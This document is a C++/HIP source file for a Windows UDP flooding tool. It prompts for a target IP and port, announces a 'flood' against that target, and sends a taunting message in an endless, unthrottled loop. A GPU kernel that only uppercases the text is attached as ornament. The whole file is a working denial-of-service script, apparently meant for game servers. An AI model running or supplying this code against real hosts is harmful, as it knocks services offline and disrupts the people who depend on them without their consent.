#include "hip/hip_runtime.h"
#include <iostream>
#include <winsock2.h>

using namespace std;

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4996)

#define SERVER "127.0.0.1"
#define BUFLEN 512  
#define PORT 8080  

char ip_address[16] = "";
int port = NULL;

__global__ void computeData(char* data, int length) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx < length) {
        // For example, convert all lowercase letters to uppercase
        if (data[idx] >= 'a' && data[idx] <= 'z') {
            data[idx] -= 32;
        }
    }
}

class UDPClient {
public:
    UDPClient() {
        if (WSAStartup(MAKEWORD(2, 2), &ws) != 0) {
            cout << "Failed. Error Code: " << WSAGetLastError() << "\n";
            exit(EXIT_FAILURE);
        }
        cout << "Initialized.\n";

        if ((client_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR) {
            cout << "socket() failed with error code: " << WSAGetLastError() << "\n";
            exit(EXIT_FAILURE);
        }

        memset((char*)&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.S_un.S_addr = inet_addr(ip_address);
    }

    ~UDPClient() {
        closesocket(client_socket);
        WSACleanup();
    }

    void start() {
        char message[] = "theres cheaters on lobby ;(!";
        int length = strlen(message);
        char* d_message;

        // Allocate memory on GPU and copy message to GPU
        hipMalloc((void**)&d_message, length * sizeof(char));
        hipMemcpy(d_message, message, length * sizeof(char), hipMemcpyHostToDevice);

        int threadsPerBlock = 256;
        int blocksPerGrid = (length + threadsPerBlock - 1) / threadsPerBlock;

        int i = 0;
        while (true) {
            // Launch CUDA kernel to process data
            computeData << <blocksPerGrid, threadsPerBlock >> > (d_message, length);

            // Copy the processed data back to CPU
            hipMemcpy(message, d_message, length * sizeof(char), hipMemcpyDeviceToHost);

            // Send the processed message
            if (sendto(client_socket, message, strlen(message), 0, (sockaddr*)&server, sizeof(sockaddr_in)) == SOCKET_ERROR) {
                cout << "sendto() failed with error code: " << WSAGetLastError() << "\n";
                exit(EXIT_FAILURE);
            }

            char answer[BUFLEN] = {};
            int slen = sizeof(sockaddr_in);
            ++i;

            if (i > 10000000) {
                cout << i << endl;
            }
        }

        // Free GPU memory
        hipFree(d_message);
    }

private:
    WSADATA ws;
    SOCKET client_socket;
    sockaddr_in server;
};

int main() {
    cout << "ip address (ex: 000.00.00.00):";
    cin >> ip_address;
    cout << endl;
    cout << "port:";
    cin >> port;
    cout << endl;

    cout << "Initializing flood against " << ip_address << ":" << port << endl;

    MoveWindow(GetConsoleWindow(), 50, 50, 500, 500, true);

    UDPClient udpClient;
    udpClient.start();
}
